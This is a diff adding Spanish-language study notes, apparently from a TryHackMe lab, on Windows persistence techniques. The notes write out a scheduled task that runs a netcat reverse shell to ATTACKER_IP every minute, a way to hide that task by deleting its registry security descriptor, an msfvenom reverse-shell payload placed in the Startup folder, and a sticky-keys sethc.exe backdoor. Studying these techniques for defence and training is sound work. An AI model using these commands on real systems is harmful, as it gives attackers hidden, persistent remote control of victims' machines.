@@ -214,6 +214,86 @@ sc.exe query state=all
 sc.exe qc servicioç
 ```
 
+# Programar tareas
+
+La forma más comun de hacer este tipo de técnica es programando tareas. Nos daun control cuando iniciamos y cuando nosotros queremos en horarios especificos o horas. Podemos utilizar
+
+```
+schtasks
+```
+
+Para crear una tarea que ejecutre una rev shell cada minuto, en un escenario real ya os digo que esto no funciona
+
+```
+schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
+```
+
+Para asegurarnos que se ha creado:
+
+```
+schtasks /query /tn thm-taskbackdoor
+```
+
+## Hacer nuestra tarea invisible
+
+Los descriptores de seguridad de las tareas se guardan en "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\" encontramos una key para cada tarea denominada "SD" 
+
+Para poner oculta la task es tan simple como borrar este valor "SD" por el valor que nostoros queramos, podemos usar psexec
+
+```
+c:\tools\pstools\PsExec64.exe -s -i regedit
+```
+
+![image](https://github.com/user-attachments/assets/e94c7a7b-fc45-4309-86a4-37562f810b4b)
+
+```
+schtasks /query /tn thm-taskbackdoor
+```
+
+```
+nc -lvnp 4449
+```
+
+# Persistencia activa por inicio de sesión
+
+Un archivo debajo de "C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" dondep odemos poner un ejecutable que se ejecute cuando el usuario se logue.
+
+Si queremos forzar para todos los usuarios lo meteremos en: "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+Vamos a generar una rev shell con msfvenom
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
+```
+
+Copiamos el paylaod a la maquina victima con httpserver 
+
+```
+python3 -m http.server
+wget http://atacanteip:8000/revshl.exe -O
+copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+```
+
+# Backdooring Login Screen / RDP
+
+Si tienemos acceso fisico o por RDP, podemos hacer un backdoor en el login screen y acceder al terminal
+
+Cuando presionamos las keys "CTRL + ALT + DEL" podemos configurar para usar windows las "sticky keys" decimos que si, cuando esten activas pulsamos 5 veces shift
+
+![image](https://github.com/user-attachments/assets/c15c1add-9e4f-449f-a973-99bb0dbbdd1a)
+
+Despues de pulsar se ejecutara el binario "C:\Windows\System32\sethc.exe" si cambiamos dicho binario podemos remplazarlo.
+
+```
+takeown /f c:\Windows\System32\sethc.exe
+icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+```
+
+
+
+
+
 
 
 
